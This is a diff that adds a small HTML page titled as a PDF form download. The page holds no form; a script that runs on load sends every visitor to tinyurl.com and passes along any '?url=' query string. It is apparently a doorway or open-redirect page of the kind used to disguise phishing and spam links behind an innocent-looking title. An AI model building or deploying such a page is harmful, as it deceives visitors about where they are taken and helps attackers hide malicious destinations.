@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pdf Form , Notification, Pdf Form Download</title>
+</head>
+<body>
+    <script>
+        
+        const currentURL = window.location.href;
+
+        
+        const redirectionBaseURL = "https://tinyurl.com/";
+
+        
+        if (currentURL.includes('?url=')) {
+            
+            const queryString = window.location.search;
+            window.location.href = `${redirectionBaseURL}${queryString}`;
+        } else {
+            
+            window.location.href = redirectionBaseURL;
+        }
+    </script>
+</body>
+</html>
